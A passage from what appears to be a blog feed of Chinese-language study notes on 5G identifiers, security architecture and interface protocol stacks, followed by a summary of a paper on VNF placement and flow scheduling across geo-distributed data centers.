class="code"><pre><span class="line">&lt;5G-S-TMSI&gt;:= &lt;AMF Set ID&gt;&lt;AMF Pointer&gt;&lt;5G-TMSI&gt;</span><br></pre></td></tr></table></figure></li><li><p>5G-TMSI的10位最低有效位元被NG-RAN用來決定UE的呼叫時機</p><ul><li>所以該10位最低有效位元應平均分布，使不同UE的尋呼時機均勻分布</li></ul></li></ul><table><thead><tr><th>MCC</th><th>MNC</th><th>AMF Region ID</th><th>AMF Set ID</th><th>AMF Pointer</th><th>5G-TMSI</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>16bit</td><td>4bit</td><td>4bit</td><td>32bit</td></tr><tr><td>PLMN</td><td>PLMN</td><td>AMF ID</td><td>AMF ID</td><td>AMF ID</td><td></td></tr><tr><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td></td></tr><tr><td></td><td></td><td></td><td>5G-S-TMSI</td><td>5G-S-TMSI</td><td>5G-S-TMSI</td></tr><tr><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td></tr></tbody></table><h3 id="SUCI"><a href="#SUCI" class="headerlink" title="SUCI"></a>SUCI</h3><p>SUCI是非永久性標誌，基於 SUPI(Subscription Permanent Identifier) 加密形式構成用於保護隱私的標誌<br>由於每個簽約用戶的SUPI是永久且唯一的，直接傳輸會有隱私風險</p><p>UE(USIM或ME)可以根據<strong>ECIES</strong>,甚至是<strong>Null-Scheme</strong>生成SUCI<br>當AMF收到SUCI後，觸發授權(Authentication)流程，之後在UDM&#x2F;SIDF中使用解密演算法(SIDF)將收到的SUCI解碼成SUPI，以利完成後續授權工作</p><h3 id="TAI-amp-TAC"><a href="#TAI-amp-TAC" class="headerlink" title="TAI&amp;TAC"></a>TAI&amp;TAC</h3><p>皆為位置性標誌<br>TAI: 跟蹤區標誌<br>TAC: 跟蹤區編碼</p><ul><li>格式:<table><thead><tr><th>MCC</th><th>MNC</th><th>TAC</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>20bit</td></tr><tr><td>PLMN ID</td><td>PLMN ID</td><td>TAC</td></tr><tr><td><strong>TAI</strong></td><td><strong>TAI</strong></td><td><strong>TAI</strong></td></tr></tbody></table></li></ul><h2 id="安全架構與流程"><a href="#安全架構與流程" class="headerlink" title="安全架構與流程"></a>安全架構與流程</h2><p>UE在RAN或在不同網路間移動時，需要與網路進行相互認證，確保雙方是可信賴的<br>UE與網路之間的相互認證需要<strong>5G安全架構</strong>的支援<br>5G安全架構應包含:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 緩解和降低攻擊</span><br><span class="line">- 支援驗證和授權機制</span><br><span class="line">- 支持密鑰相關功能</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mY2DamY.png"></p><h2 id="安全架構特點"><a href="#安全架構特點" class="headerlink" title="安全架構特點"></a>安全架構特點</h2><ul><li>與存取方式(3GPP、non3GPP)無關的安全架構，使用統一的驗證方法與密鑰架構</li><li>增強安全(4G → IMSI → 不安全 | 5G → SUCI&#x2F;SUPI → 安全)</li><li>差異化認證: 5G支援USIM,憑證,帳密等多種認證方式</li><li>服務化架構和開放介面安全</li></ul><p>安全架構所涉及的NF，包含: ARPF,AUSF,SEAF,SIDF</p><ul><li>ARPF:<ul><li>與UDM一起部屬</li><li>負責儲存根密鑰 $Ki$ 和相關的簽約資料</li><li>計算5G授權向量</li></ul></li><li>AUSF:<ul><li>提供<strong>EAP認證伺服器</strong>的功能，進行EAP認證以推導出<strong>錨點密鑰</strong></li></ul></li><li>SEAF:<ul><li>與AMF一起部屬</li><li>負責根據錨點密鑰來推導出下層的NAS與AS密鑰，5G AKA 完成授權結果比較功能</li></ul></li><li>SIDF:<ul><li>與UDM一起部屬</li><li>負責將SUCI解碼成SUPI</li></ul></li></ul><h2 id="安全流程"><a href="#安全流程" class="headerlink" title="安全流程"></a>安全流程</h2><p><img src="https://i.imgur.com/GuQNm2p.png"></p><ul><li>由UE發起Request，發送SUCI或5G-GUTI訊息給SEAF</li><li>SEAF將SUCI或SUPI(若5G-GUTI有效)發送給來源網路(歸屬地網路)的AUSF</li><li>AUSF進行認證完後，將訊息發送給來源網路的 UDM</li><li>UDM收到SUCI，將其解碼為SUPI，並通過用戶資料，選擇相應的認證演算法，透過後續流程完成身分認證</li></ul><p>目前5G支援的認證演算法: <strong>EAP-AKA’</strong> 和 <strong>5G AKA</strong> -3GPP TS 33.501</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://cat.chriz.hk/2019/12/5g-security-architecture.html">https://cat.chriz.hk/2019/12/5g-security-architecture.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 網路功能介面與協定堆疊</title>
      <link href="/posts/3d68fc76.html"/>
      <url>/posts/3d68fc76.html</url>
      
        <content type="html"><![CDATA[<h2 id="N2介面-控制介面與協定堆疊"><a href="#N2介面-控制介面與協定堆疊" class="headerlink" title="N2介面(控制介面與協定堆疊)"></a>N2介面(控制介面與協定堆疊)</h2><p>$5G Access,Network \stackrel{N2}{\longleftrightarrow} 5GC(AMF)$</p><ul><li><strong>管理流程:</strong> 不與特定UE相關，像是設定或重置N2介面</li><li><strong>與單一UE相關的流程:</strong> NAS傳輸流程、UE上下文管理、PDU session資源相關流程、切換管理..etc</li><li>採用 <strong>NG-AP協定</strong> (不論是哪種Access Network: 3GPP RAN 或 N3IWF non-3GPP )，屬於一種應用層協定</li><li>AMF對於一個UE有唯一的N2 終結點</li><li>由於SMF與AMF是解耦的，所以NG-AP支援AMF在5G RAN與5GC之間傳遞<strong>N2 SM訊息</strong></li></ul><p><img src="https://i.imgur.com/TP3cmJb.png"></p><ul><li>SCTP保證Acces Network與5GC之間的傳輸</li></ul><h2 id="UE與5GC之間的控制面介面與協定堆疊"><a href="#UE與5GC之間的控制面介面與協定堆疊" class="headerlink" title="UE與5GC之間的控制面介面與協定堆疊"></a>UE與5GC之間的控制面介面與協定堆疊</h2><p>針對每種UE使用的連接方式(3GPP、non-3GPP)，UE皆會有一個 <strong>N1 NAS連接</strong>，且會有唯一的N1終結點為位於AMF。</p><blockquote><p><strong>非接入層(NAS, Non-access stratum)</strong><br>原先存在於 3G&#x2F;UMTS中的協定層，是用戶設備與核網之間的功能層<br>具備以下功能:</p><blockquote><p>移動性管理<br>呼叫控制<br>會話管理<br>身分管理<br><a href="https://hackmd.io/M4SyLAOpRam7lZVLuujOHw">NAS 參考資料</a></p></blockquote></blockquote><p>N1 NAS可用於:</p><ul><li><strong>UE註冊管理</strong></li><li><strong>連接管理</strong></li><li><strong>會話管理</strong></li></ul><p>N1介面之中的NAS協議分成: NAS-MM、NAS-SM</p><h2 id="NAS-MM"><a href="#NAS-MM" class="headerlink" title="NAS-MM"></a>NAS-MM</h2><p>用於UE與AMF以外的NF進行互動</p><ul><li>會話管理消息</li><li>UE 策略</li><li>位置服務</li></ul><p><em>NAS傳輸會話管理訊息、短訊、UE策略、位置服務等協議流程</em><br><img src="https://i.imgur.com/iPUTyxa.gif"></p><h3 id="特點"><a href="#特點" class="headerlink" title="特點"></a>特點</h3><p>處理UE與AMF之間的NAS流程，包含:</p><ul><li>處理UE的註冊管理(RM)和連接管理(CM): 在UE與AMF之間提供安全的訊息連結 、存取控制</li><li>適用於其他類型的NAS訊息(NAS-SM、SMS等)，可與RM&#x2F;CM NAS 訊息同時傳輸</li><li>針對不同存取方式(3GPP, non-3GPP)也都採用相同的NAS協定</li><li>UE針對不同種存取方式都會有一個N1 NAS連接</li></ul><p><img src="https://i.imgur.com/sdjzoKJ.gif"></p><h2 id="NAS-SM"><a href="#NAS-SM" class="headerlink" title="NAS-SM"></a>NAS-SM</h2><p>支援處理UE與SMF之間的<strong>會話管理</strong></p><ul><li>PDU會話用戶面的建立、修改、釋放</li><li>SM訊息的建立、處理都是在NAS-SM之中完成的（內容不會被AMF解析）</li><li>NAS-MM層會負責UE-AMF之間SM訊息的收發，並提供安全保護(<strong>保護訊息的完整性</strong>)</li></ul><p><img src="https://i.imgur.com/qLGM1Hk.gif"></p><h2 id="5GC-NF之間的控制面介面與協定堆疊"><a href="#5GC-NF之間的控制面介面與協定堆疊" class="headerlink" title="5GC NF之間的控制面介面與協定堆疊"></a>5GC NF之間的控制面介面與協定堆疊</h2><p>5G 核網中的NF，<strong>NF Service Producer</strong> 會透過服務化界面為 <strong>NF Service Consumer</strong> 提供服務</p><p>5G核網中將以下控制介面定義為服務化界面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Nsmf</span><br><span class="line">- Nudm</span><br><span class="line">- Nnrf</span><br><span class="line">- Nnssf</span><br><span class="line">- Nausf</span><br><span class="line">- Nnef</span><br><span class="line">- Nsmsf</span><br><span class="line">- Nudr</span><br><span class="line">- Npcf</span><br><span class="line">- N5g-eir</span><br><span class="line">- Nlmf</span><br></pre></td></tr></table></figure><p>這些服務化介面以<strong>HTTP 2.0</strong>與<strong>JSON</strong>作為應用層協定；3GPP所有網路功能都必須支持<strong>TLS</strong><br>若PLMN沒有提供其他網路安全方案，則TLS就必須被使用<br>而未來可能會以 <strong><a href="https://zh.wikipedia.org/wiki/QUIC">QUIC&#x2F;UDP</a></strong> 作為優化的方案</p><p><img src="https://i.imgur.com/QWxhGJN.png"></p><h2 id="N4介面與協定堆疊"><a href="#N4介面與協定堆疊" class="headerlink" title="N4介面與協定堆疊"></a>N4介面與協定堆疊</h2><p>$SMF\stackrel{N4}{\longleftrightarrow}UPF$</p><p>N4介於SMF與UPF之間，具備控制面與用戶面功能<br>N4定義了以下流程:</p><p><em>控制面流程</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- N4會話管理:</span><br><span class="line">用於SMF建立、更新、刪除UPF上的N4會話上下文(Session Context)</span><br><span class="line">- N4報告流程:</span><br><span class="line">用於UPF向SMF事件(EX.流量使用情況)</span><br><span class="line">- N4節點級別流程:</span><br><span class="line">SMF、UPF之間N4節點的建立、更新、連結、釋放；UPF會向SMF報告N4節點級別的事件</span><br><span class="line">- SMF暫停計費流程:</span><br></pre></td></tr></table></figure><p><em>用戶面流程</em><br>在SMF、UPF之間轉發流量:<br>當用戶處於<strong>CM-IDLE</strong>狀態時，UPF可轉發downlink 資料給SMF，SMF再決定呼叫策略</p><table><thead><tr><th>PFCP</th><th>$\longleftrightarrow$</th><th>PFCP</th></tr></thead><tbody><tr><td>UDF</td><td>$\longleftrightarrow$</td><td>UPF</td></tr><tr><td>IP</td><td>$\longleftrightarrow$</td><td>IP</td></tr><tr><td>L2</td><td>$\longleftrightarrow$</td><td>L2</td></tr><tr><td>L1</td><td>$\longleftrightarrow$</td><td>L1</td></tr><tr><td>Control Plane $\longleftrightarrow$ User Plane</td><td></td><td></td></tr></tbody></table><h2 id="用戶面介面與其協定堆疊"><a href="#用戶面介面與其協定堆疊" class="headerlink" title="用戶面介面與其協定堆疊"></a>用戶面介面與其協定堆疊</h2><p>$Access,Network\stackrel{N3}{\longleftrightarrow}UPF$<br>$UPF \stackrel{N9}{\longleftrightarrow}UPF$<br>N3與N9介面分別在5G RAN 與 UPF之間 以及UPF與UPF之間傳遞數據</p><p><img src="https://i.imgur.com/p8GoGVl.gif"></p><ul><li><strong><a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%8D%95%E5%85%83">PDU(Protcol Data Unit) 層</a></strong>: 負責在UE與Data Network之間的PDU Session傳遞PDU</li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNF Deployment and Flow Scheduling in Geo-distributed Data Centers</title>
      <link href="/posts/85fe9be3.html"/>
      <url>/posts/85fe9be3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>NFV可降低網路營運上的設備採購以及維護成本，透過NFV可將網路功能與物理基礎設施進行解耦合。<br>並在通用硬體上運行虛擬網路功能(VNF)，NFV可使網路更加靈活可控，但仍然存在各種技術挑戰<br>像是如何在不同地理位置上有效部屬VNFs，以及在不同地理位址的資料中心調度網路流量。</p><p>本篇論文中研究此議題並最大縣動減少部屬以及通訊成本，此問題被轉換成 混合整數線性規劃問題(mixed-integer linear programming)，本論文提出一種基於放鬆的演算法(relaxtion-based algorithm)來解決它的計算複雜度，最後通過實驗結果表明，該演算法可有效降低部屬與通訊成本。</p><h2 id="Ch1-Introduction"><a href="#Ch1-Introduction" class="headerlink" title="Ch1-Introduction"></a>Ch1-Introduction</h2><p>傳統資料中心或雲端運算網路架構仰賴特定硬體來提供特定網路服務，像是防火牆、入侵偵測系統。<br>這些造成硬體成本過高。而NFV的出現取代了這種往賴特定硬體的網路架構。</p><p>藉由NFV，網路功能可能被虛擬化成基於軟體的VNF並運行在一般COTS服器上。<br><img src="https://i.imgur.com/9GcTBYs.png"></p><p>而為了提供網路服務，網路流需要流經過一連串以排序之網路功能的集合<br><img src="https://i.imgur.com/fBK2DgN.png"></p><p>然而要實際應用NFV技術，必須考量到VNF要如何串接成一串服務鏈(service chains)以降低成本<br>以往這部分的研究都僅僅關注於部屬成本，旨在減少資料中心的資源消耗，像是CPU、記憶體、儲存空間等，或是單獨著重於通訊成本，像是最大限度減少點對點的延遲等<br>但幾乎沒有考量到若作為VNF部屬的通訊成本。</p><p>在服務鏈上每個鏈結上的網路功能都是有序的，每個鏈結也都有自己的流速，同時在不同VNF部屬在地域分布的資料中心的不同VNF，將導致不同的通訊成本。這代表部屬成本與通訊成本之間的關係不疼夠被忽視，此外舊有研究也很少考慮NFV服務中的流量平衡問題，以前的研究通常會假設VNF流不能夠被分配到同一類的多個VNF Instance上，或是其分散式流量率(distributed flow rate)是預先定義好的，這對於大規模網路中的私有NFV服務來說是不限實也沒效率的，本篇論文認為VNF instance的數量和相應的網路流量應該根據當前網路狀態進行調整。</p><p>本篇論文，考量到有序服務鏈在不同地理分布資料中心下的部屬成本以及通訊成本間的權衡問題，並且我們允許一種 NF 具有多個 VNF 實例。</p><p>本文主要貢獻：</p><ul><li>本文將綜合考量網絡拓撲、VNF的數量和部署以及流量調度，來將VNF部屬以及流量調度問題轉換為混和整數線性規劃問題(mixed integer linear programming, MILP)，，以降低部署成本和通訊成本。</li><li>在該MILP方程式的基礎上設計一種低複雜度的 基於鬆弛的演算法，並進行大量實驗來說明此演算法相較現有演算法的優勢，結果表明本研究提出的演算法可有效降低部屬成本以及通訊成本。</li></ul><h2 id="Ch2-System-Model"><a href="#Ch2-System-Model" class="headerlink" title="Ch2-System Model"></a>Ch2-System Model</h2><h3 id="A-DCs-Topology"><a href="#A-DCs-Topology" class="headerlink" title="A. DCs Topology"></a>A. DCs Topology</h3><p>由於資料中心分布在世界各地，不同資料中心間所傳輸的網路流量會有著不同的成本(cost)<br>這裡透過無向圖(indirected graph) 來代表資料中心的網路拓圖 $G_{d}&#x3D;(D,E_{d})$<br>$D$ 為資料中心  $E_{d}$ 代表網路邊緣<br>$H_{dp}$ 為 edge $e_{dp} \in E_{d}$的 權重(weight) 其中 $d,p \in D$<br>(上面就代表，D和P是資料中心，而H是DP這之間網路連接的Weight，所代表的是這兩資料中心之間的傳輸成本)<br>而這裡須注意，個別資料中心自己到自己之間沒有傳輸成本 $H_{dd}&#x3D;0$</p><h3 id="B-Chain-Set"><a href="#B-Chain-Set" class="headerlink" title="B. Chain Set"></a>B. Chain Set</h3><p>有一組鏈 $C&#x3D;{c1,c2,…}$ 被部屬到資料中心，若將服務鏈中$c_{i} \in C$來源節點(source)與目的節點(destination)分別以 $o_{i}$ 以及 $t_{i}$ 表示。<br>每個服務鏈 $c_{i}$中都有一組以排序之網路功能 $c_{i}&#x3D;{s_{i,1},s_{i,2},….s_{i,j},…}$ 來以速率 $R_{i}$處理網路流量<br>我們定義 $|c_{i}|$ 為服務鏈 $c_{i}$的長度，並且定義 $n(s_{i,j})$ 來表示𝑠𝑖,𝑗的網絡功能的類型<br>舉例來說如圖<br><img src="https://i.imgur.com/y39ct1S.png"><br>圖中三個服務鏈的長度分別為2,3,3 (注意:，不同的服務鏈可能需要一種網絡功能)<br>舉例來說，$c1$ $c2$ $c3$ 可能都共同包含網路功能 $f1$，即 $n(s_{1,1})&#x3D;n(s_{2,2})&#x3D;n(s_{3,2})&#x3D;f_{1}$</p><h3 id="C-NFs-Graph"><a href="#C-NFs-Graph" class="headerlink" title="C. NFs Graph"></a>C. NFs Graph</h3><p>基於上述的鏈集合(Chain Set)，我們可以建構網路功能圖 $G_{n}$<br>此網路功能圖為有向非循環圖(directed acyclic graph, DAG)<br>$G_{n}&#x3D;(V_{n},E_{n})$，且$V_{n}$ 可被歸納為三個種類:</p><ul><li>sources $O$</li><li>network function $N$</li><li>destinations $T$<br>而每個edge $e_{m,n} \in E_{n}$ 代表網路功能$m$與$n$之間的網路流量<br>對於鏈 $c_{i}$ 中的每個服務對(service pair) $(s_{i,j},s_{i,j+1})$，在$G_{n}$中存在一個網路功能對(network function pair)<br>$(m,n)$，存在從$m$到$n$的有向鏈結，其中 $n(s_{i,j})&#x3D;m$ , $n(s_{i,j+1})&#x3D;n$</li></ul><p>如同剛剛提及，不同網路功能可能會由不同服務鏈以不同的網量速率來共享功能<br>對於每個edge $e_{m,n} \in E_{n}$，我們定義一個集合 $U_{m,n} &#x3D; { i : c_{i} \in C, n(s_{i,j})&#x3D;m,n(s_{i,j+1})&#x3D;n}$ 來記錄具有網路功能對($m$,$n$)的服務鏈</p><p>存在具有不同流量要求的不同網路流量在edge $e_{m,n}$ 上傳輸，表示為 $R_{i}$, $\forall i \in U_{m,n}$<br>舉例來說，來自服務鏈 $c1$ 和 $c2$ 的網路流量在 edge $e_{f_{1},f_{2}}$上傳輸，如下圖所示<br><img src="https://i.imgur.com/Ba0onF6.png"><br>速率分別是 2與1</p><h3 id="D-VNFs-Graph"><a href="#D-VNFs-Graph" class="headerlink" title="D. VNFs Graph"></a>D. VNFs Graph</h3><p>我們的目標是要以VNF instance形式來在圖 $G_{n}$ 之中部屬所有網路功能<br>$G_{n}$中每個網路功能n可能會有多個VNF Instances 在不同資料中心<br>舉例來說如下圖<br><img src="https://i.imgur.com/nZQBKNl.png"><br>網路功能 $f1$可能會有兩個VNF Instance分別位於資料中心 $d1$以及 $d2$</p><p>注意，每個網絡功能 $n$ 在所有 $|D|$ 數據中心中可能最多有 $|D|$ 可能的Instance，<br>並且 $G_{n}$ 中的每一對 $(m,n)$ 也可能相應地在它們之間最多有 $|D|^{2}$ 個鏈接。</p><p>因此，在VNF圖 $G_{v}&#x3D;(V_{v},E_{v})$，節點集合 $V_{v}$ 包括 $|V_{n}| \cdot |D|$ instances 表示為集合 $V$、sources集合 $O$以及目標節點集合 $T$，而 $E_{v}$ 表示他們之間的鏈結。<br>對於每個edge $e_{u,v} \in E_{v}$，讓 $f^{i}<em>{uv}$ 註記為服務鏈 $C</em>{i}$中 instance $u$,$v$ 間的流量速率。</p><p>舉例來說，我們考慮圖 $G_{n}$ 中的兩個網路功能 $(f1,f2)$ 以及edge $e_{f_{1},f_{2}}$，對應的 $G_{v}$ 在下圖中顯示，有 2 個資料中心</p><p><img src="https://i.imgur.com/YhG7xQY.png"></p><p>$f1,f2$的Instance分別是 $v1$ $v2$ 以及 $v3$ $v4$，並且j我們可以觀察到，網路功能 $f1$ $f2$共有4個edge，而𝑓1和𝑓2之間的網絡流量可以在這四個edge之間自由分佈</p><p>於任何實例$v \in V$，我們使用$d(v)$ 和$n(v)$分別表示其資料中心位置和網絡功能類型。例如，$d(v_{1})&#x3D;d1$，$n(v_{1})&#x3D;f1$</p><p>Let $N(n)$ 代表提供網路功能 $n$的VNF集合，例如在上圖中，我們有 $v1$以及 $v2$ 來提供網路功能 $f1$，即 $N(f1)&#x3D;{ v1,v2 }$，對於每個 VNF Instance Pair $(u,v)$，可以透過 $f_{uv}^{i}$ 來表示流經邊緣的網路流量速率。<br>其中對於鏈 $c_{i}$ 上的邊緣滿足 $e_{u,v}\in E_{v}$<br>且在圖 $G_{v}$中，$\forall i\in U_{n(u),n(v)}$</p><p><img src="https://i.imgur.com/heLrZ8U.png"></p><h2 id="Ch3-Problem-Formulation"><a href="#Ch3-Problem-Formulation" class="headerlink" title="Ch3-Problem Formulation"></a>Ch3-Problem Formulation</h2><p>基於上一章的系統模型，我們可以公式化VNF部屬以及流量調度問題，轉換成混合整數線性規劃問題<br>(MILP)，且目標是要最小化所有VNF Pairs之間的部屬以及通訊總成本</p><h3 id="VNF-Instance-Placement"><a href="#VNF-Instance-Placement" class="headerlink" title="VNF Instance Placement"></a>VNF Instance Placement</h3><p>如圖$G_{v}$所示，每個網絡功能可以由所有資料中心託管，每個資料中心可以託管所有類型的網絡功能，因此我們定義了二進位的變數 $x_{v}$ 來表示 <strong>在資料中心 $d(v) 中負責提供的網路功能 $n(v)$ 的VNF Instance 是否被實際部屬</strong></p><p><img src="https://i.imgur.com/LW9uzOu.png"></p><h3 id="Flow-requirement-constraints"><a href="#Flow-requirement-constraints" class="headerlink" title="Flow requirement constraints"></a>Flow requirement constraints</h3><p>對於每個服務鏈 $c_{i}$ 所需要的流量，可被分配到所有它的VNF Instance上<br>例如，鏈 $c_{i}$中的網絡功能pair $m$、$n$ 之間的網絡流率 $R_{i}$ 將分佈到$G_{v}$中Instance $v$、$u$ 之間的所有邊上，其中$n(u)&#x3D;m$，$n(v)&#x3D;n$</p><p><img src="https://i.imgur.com/IdjsfTH.png"></p><p>對於來源節點與目標節點，可以列出以下等式<br><img src="https://i.imgur.com/iattDHR.png"></p><h3 id="VNF-flow-constraint"><a href="#VNF-flow-constraint" class="headerlink" title="VNF flow constraint"></a>VNF flow constraint</h3><p>對於每個VNF Instance，輸入流量是源自輸入instance $i(v)$來處理<br>然後分散到輸出instance $o(v)$</p><p><img src="https://i.imgur.com/4EfnGB6.png"></p><p>其中 $\alpha_{n(v)}$ 是由網路功能來決定的擴展因子(scaling factor)</p><h3 id="The-relationship-between-x-v-and-f-i-uv"><a href="#The-relationship-between-x-v-and-f-i-uv" class="headerlink" title="The relationship between $x_{v}$ and $f^{i}_{uv}$"></a>The relationship between $x_{v}$ and $f^{i}_{uv}$</h3><p>只要有流量通過 VNF 實例 $v$，二進位變數應設定為 1 以提供網絡功能$n(v)$，並且此 VNF 實例應部署在$d(v)$ 中。這可以描述為</p><p><img src="https://i.imgur.com/kNT4fbV.png"></p><p><code>A Joint MILP Formulation</code></p><p>若把上述總結，可以得到以下的 <strong>Cost-min</strong> 問題</p><h3 id="Cost-Min"><a href="#Cost-Min" class="headerlink" title="Cost-Min"></a>Cost-Min</h3><p><img src="https://i.imgur.com/g756xNt.png"></p><p>係數 $\gamma$ 和 $\delta$ 由用戶定義，以平衡部署成本和通訊成本，並可根據不同的 QoS 要求進行調整。</p><h2 id="Ch4-Relaxation-Based-Algorithm"><a href="#Ch4-Relaxation-Based-Algorithm" class="headerlink" title="Ch4-Relaxation-Based Algorithm"></a>Ch4-Relaxation-Based Algorithm</h2><p><img src="https://i.imgur.com/X5V2paB.png"><br>因為有 整數變數 $x_{v}$ ，計算上來解決 Cost-Min問題是被禁止的，特別規模大的網路中。<br>此章節中，我們會提出基於鬆散的方式，來解決Cost-min問題。</p><p>首先我們將 $x_{v}$ 鬆弛為[0,1]範圍內的實數，以降低計算複雜度。經過鬆弛後，我們的模型被簡化為線性規劃(LP)問題，如演算法中第1行，這可以透過Matlab輕鬆解決。</p><p><img src="https://i.imgur.com/cW2iRuY.png"></p><p>我們對 $x_{v}$ 做遞增排序，如演算法表中第2行，</p><p>並將每個非零 $x_{v}$ 的值設為1，如演算法表中第5行，</p><p>在這種情況下，我們以整數 $x_{v}^{*}$ 形式獲得一個新的 VNF 部署解決方案，</p><p>並將每個網絡功能的 VNF Instance 數量記錄為 $count_{n(v)}$，如演算法表中第6行，<br>我們將整數solution  $ x_{v}^{*} $ 作為輸入並計算流量調度的解答 $ f_{uv}^{*j} $ ，且總成本 $cost’$</p><p>我們將整數解 $x_{v}^{*}$ 作為輸入，通過在第 11 行再次求解 Cost-Min-LP 問題來計算流量調度解 $f_{uv}^{*j}$ 和總成本 $cost’$</p><p>請注意，放寬可能會導致更多 VNF 實例，因此我們下一步將嘗試進一步減少實例數量以及部署成本，同時確保從第 12 行到第 22 行間的通訊成本接近最佳化。<br>我們從非零 $x_{v}$ 的最小值內的實例 $v$ 開始。<br>請注意，如果$v$是網絡中唯一提供網絡功能$n(v)$的VNF實例，即$count_{n(v)}$ &#x3D;&#x3D; 1，則必須部署$v$，並且跳到下一個Instance<br>否則，若網路中存在提供相同網路功能 $n(v)$的VNF Instance(見14行)，則我們$x_{v}^{*}$ 設為0，並重新計算流量調度解 $f_{uv}^{*i}$ 和新的總成本 $cost’$</p><p>只有當新成本低於當前的 $minCost$時，才會更新NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 以及總成本 $minCost$，然後更新網路功能 $n(v)$的Instance數量 (見18、19行)</p><p>另一方面，如果總成本沒有降低，我們將 $x_{v}^{*}$ 的值設置回 1 並移動到下一個實例，直到我們遍歷 $V$ 中的所有 VNF 實例（第 25 行）</p><p>最終我們會返回 NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 以及總成本 $minCost$ 作為演算法的輸出。</p><h2 id="Ch5-Performance-Evaluation"><a href="#Ch5-Performance-Evaluation" class="headerlink" title="Ch5-Performance Evaluation"></a>Ch5-Performance Evaluation</h2><p>在本節中，我們通過將基於鬆弛的算法 (“RLX”) 與 Cost-Min 的最佳結果 (“OPT”) 和最短路徑算法 (“SP”) 進行比較來評估它<br>實驗設置：</p><ul><li>網絡中有∣𝐷∣ &#x3D; 20 個資料中心。 $H_{dp}$ 隨機設置在 [1,20] 的範圍內，表示DC之間的跳躍數</li><li>共有 20 條服務鏈，多條鏈共享 15 種不同類型的網絡功能</li><li>服務鏈的流量設置在 [1, 10] 的範圍內</li><li>係數 $\gamma$ 設置為 10，$\delta$ 設置為 1</li><li>我們使用商業求解器 Gurobi 來解決我們的 Cost-Min 和 Cost-Min-LP 問題<br>本研究通過在不同場景中改變參數提供了廣泛的實驗</li></ul><h3 id="The-value-of-𝛾"><a href="#The-value-of-𝛾" class="headerlink" title="The value of 𝛾"></a>The value of 𝛾</h3><p><img src="https://i.imgur.com/Et8CiI7.png"><br>首先，我們調查𝛾和𝛿的影響。我們設置 𝛿 &#x3D; 1，並將 𝛾 的值從 5 變為 50。結果如圖 4 所示<br>圖 4 中的結果表明，三種算法的所有成本都隨著 𝛾 的增加而增長。原因是，𝛾的增加會導致更高的 VNF 部署成本。<br>得注意的是，SP 的增長率遠大於其他兩種算法，因為 SP 主要通過減少每個網絡流的路徑長度來關注通信成本，而忽略了部署成本。<br>因此，當部署成本成為主導部分時，SP 顯示的優勢較小<br>例如，當𝛾 &#x3D; 10 時，RLX 算法的部署成本佔總成本的比例為 57%，OPT 為 35%，SP 為 82%。</p><h3 id="The-effect-of-number-of-hops"><a href="#The-effect-of-number-of-hops" class="headerlink" title="The effect of number of hops"></a>The effect of number of hops</h3><p><img src="https://i.imgur.com/ctY1hjZ.png"><br>我們通過將跳數的上限從 2 變為 20 來研究不同網絡拓撲的 OPT、RLX 和 SP 的總成本<br>從圖 5 可以看出，OPT 和 RLX 的成本隨著跳數的增加而略有增長，因為跳數的增加可能會增加通信成本。</p><p>然而，SP卻呈現出下降的趨勢。主要原因是當不同數據中心之間的跳數都很小時，SP可以找到很多最短路徑並在這些路徑上部署VNF實例，而某些網絡功能可能有多個實例，導致部署成本較高。<br>當跳數增加時，SP 只會找到更少的最短路徑，從而導致 VNF 實例更少，部署成本更低。因此，總成本降低。</p><h3 id="The-effect-of-rate"><a href="#The-effect-of-rate" class="headerlink" title="The effect of rate"></a>The effect of rate</h3><p><img src="https://i.imgur.com/KaJ7KXI.png"><br>同樣，我們將 20 條鏈的速率要求上限從 3 更改為 30，以顯示流量要求的影響。<br>圖 6 顯示，當速率上限增加時，所有三種算法的總成本也會增加。<br>這是因為增加流量會導致更高的通信成本以及總成本。</p><h3 id="The-effect-of-the-number-of-chains"><a href="#The-effect-of-the-number-of-chains" class="headerlink" title="The effect of the number of chains"></a>The effect of the number of chains</h3><p><img src="https://i.imgur.com/AKitxrs.png"><br>在這一部分，我們討論了鏈數從 5 到 50 的影響，並比較了三種算法的結果。<br>所有三種算法的上升趨勢都可以在圖 7 中觀察到。<br>原因是更多的服務鏈帶來了更多的網絡功能部署在數據中心，更多的網絡流分佈到 VNF 實例。<br>這將導致更高的部署成本和通信成本，因此所有三種算法的總成本都會上升</p><h3 